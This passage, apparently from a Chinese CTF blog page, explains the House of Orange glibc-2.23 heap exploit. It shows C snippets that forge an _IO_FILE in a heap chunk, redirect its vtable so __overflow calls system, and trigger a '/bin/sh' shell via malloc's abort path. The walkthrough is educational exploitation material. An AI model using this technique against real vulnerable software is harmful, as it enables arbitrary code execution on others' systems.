+<h4 id="伪造-IO-FILE-绕过检查与劫持执行流"><a href="#伪造-IO-FILE-绕过检查与劫持执行流" class="headerlink" title="伪造 _IO_FILE 绕过检查与劫持执行流"></a>伪造 _IO_FILE 绕过检查与劫持执行流</h4><p>设置 _IO_write_base &lt; _IO_write_ptr 来触发刷新</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪造 _IO_FILE 结构体字段绕过检查</span></span><br><span class="line">this-&gt;fd_nextsize = (<span class="keyword">struct</span> malloc_chunk *)<span class="number">2</span>; <span class="comment">// _IO_write_base</span></span><br><span class="line">this-&gt;bk_nextsize = (<span class="keyword">struct</span> malloc_chunk *)<span class="number">3</span>; <span class="comment">// _IO_write_ptr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 劫持 vtable 指针</span></span><br><span class="line">*(<span class="type">size_t</span> **)((<span class="type">char</span> *)this + <span class="number">0xd8</span>) = buf; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造 vtable 中的 __overflow</span></span><br><span class="line">buf[<span class="number">3</span>] = (<span class="type">size_t</span>)system;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>绕过检查</strong>：<code>_IO_flush_all_lockp</code> 函数在调用虚函数前，会检查流的状态（判断 <code>_IO_write_ptr &gt; _IO_write_base</code> 等）。我们利用 <code>fd_nextsize</code> 和 <code>bk_nextsize</code>（它们在内存中的位置刚好对应 _IO_write_base 和 _IO_write_ptr）赋上 2 和 3，满足 3 &gt; 2，成功骗过系统。</li>
+</ul>
+<p>此时，系统已经把我们的这个 chunk（this）强行当成了一个 _IO_FILE 结构体来读取。我们需要让伪造的结构体满足上述条件。</p>
+<p><strong><font style="color:#07787E;">而 malloc_chunk 的字段和 _IO_FILE 的字段在内存偏移上已经形成了完美的对应：  </font></strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00</span>	prev_size	          _flags	              <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="number">0x08</span>	size	              _IO_read_ptr	          <span class="number">0x61</span></span><br><span class="line"><span class="number">0x10</span>	fd	                  _IO_read_end	          main_arena_addr...</span><br><span class="line"><span class="number">0x18</span>	bk	                  _IO_read_base	          _IO_list_all - <span class="number">0x10</span></span><br><span class="line"><span class="number">0x20</span>	fd_nextsize	          _IO_write_base	      <span class="number">2</span></span><br><span class="line"><span class="number">0x28</span>	bk_nextsize	          _IO_write_ptr	          <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>vtable 劫持</strong>：</li>
+<li>在 _IO_FILE 结构体的末尾（64位系统下偏移为 <strong>0xd8</strong> 的位置），存放着一个指向 _IO_jump_t 结构体的指针，这就是 <strong>vtable（虚函数表）指针</strong>。代码将其指向了我们全局控制的数组 buf。</li>
+<li><strong>填入 System</strong>：buf[3] 对应虚函数表中的 __overflow 函数。将其赋值为 system。</li>
+</ul>
+<h4 id="引爆-The-Trigger"><a href="#引爆-The-Trigger" class="headerlink" title="引爆 (The Trigger)"></a>引爆 (The Trigger)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br></pre></td></tr></table></figure>
+
+<p>当执行最后的 malloc(0x18) 时，发生了以下连环反应：</p>
+<ol>
+<li>触发 Unsorted Bin Attack，改写了 _IO_list_all。</li>
+<li>将伪造的 chunk 放入了 Small Bin (0x60)。</li>
+<li>因为此时堆结构已经被破坏（比如 Unsorted bin 链表断裂），malloc 会触发 malloc_printerr 报错。</li>
+<li>报错机制会调用 abort，进而触发 _IO_flush_all_lockp。</li>
+<li>libc 顺着被篡改的 _IO_list_all 和 _chain 找到了我们的 fake chunk。</li>
+<li>检查通过，调用 vtable 中的 __overflow。</li>
+<li>实际执行 system(this)，由于 this 开头是 “&#x2F;bin&#x2F;sh”，最终成功获得 Shell。</li>
+</ol>
+<blockquote>
+<p>更新: 2026-04-26 12:04:29<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/bnmzebk3hfmig539">https://www.yuque.com/idcm/wnemg9/bnmzebk3hfmig539</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="de1ctf_2019_weapon" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseofRoman/de1ctf_2019_weapon/" aria-label="前一篇: de1ctf_2019_weapon" title="前一篇: de1ctf_2019_weapon"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            de1ctf_2019_weapon
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="houseoforange_hitcon_2016" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseofOrangeglibc-2.23/houseoforange_hitcon_2016/" aria-label="后一篇: houseoforange_hitcon_2016"  title="后一篇: houseoforange_hitcon_2016"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          houseoforange_hitcon_2016
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-Orange-glibc-2-23"><span class="toc-number">1.</span> <span class="toc-text">House of Orange glibc-2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-House-of-Orange%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 House of Orange？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-Orange-Poc"><span class="toc-number">1.1.1.</span> <span class="toc-text">House of Orange Poc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%80%E6%AE%B5-POC-%E5%90%A7%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">解释一下这一段 POC 吧：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E4%B8%8E%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.1.</span> <span class="toc-text">内存布局与地址泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-Chunk-%E5%85%83%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">伪造 Chunk 元数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsorted-Bin-Attack-%E5%8A%AB%E6%8C%81%E9%93%BE%E8%A1%A8%E5%A4%B4"><span class="toc-number">1.2.3.</span> <span class="toc-text">Unsorted Bin Attack 劫持链表头</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FSOP-%E7%BB%93%E6%9E%84%E4%BD%93%E9%87%8D%E5%8F%A0"><span class="toc-number">1.2.4.</span> <span class="toc-text">FSOP 结构体重叠</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E5%AF%B9-main-arena-%E5%92%8C-bins-%E7%9A%84%E5%81%8F%E7%A7%BB%E5%86%8D%E8%BF%9B%E8%A1%8C%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">这里对 main_arena 和 bins 的偏移再进行解释：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#main-arena%EF%BC%9A%E5%88%86%E9%85%8D%E5%8C%BA%E7%BB%93%E6%9E%84-malloc-state"><span class="toc-number">1.2.4.1.1.</span> <span class="toc-text">main_arena：分配区结构 (malloc_state)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-IO-FILE-%E7%BB%95%E8%BF%87%E6%A3%80%E6%9F%A5%E4%B8%8E%E5%8A%AB%E6%8C%81%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">1.2.5.</span> <span class="toc-text">伪造 _IO_FILE 绕过检查与劫持执行流</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E7%88%86-The-Trigger"><span class="toc-number">1.2.6.</span> <span class="toc-text">引爆 (The Trigger)</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "index",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseofOrangeglibc-2.23/index/",
+          excerpt: "",
+          description: "",
+          stripContent: "House of Orange glibc-2.23什么是 House of Orange？House of Orange 是针对于 libc-2.23 的一种攻击方法，是将 libc_heap 攻击和 __IO_FILE 攻击组合起来的利用手段  House of Orange Poc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/* * Fo",
+          date: "Tue Apr 28 2026 18:25:57 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
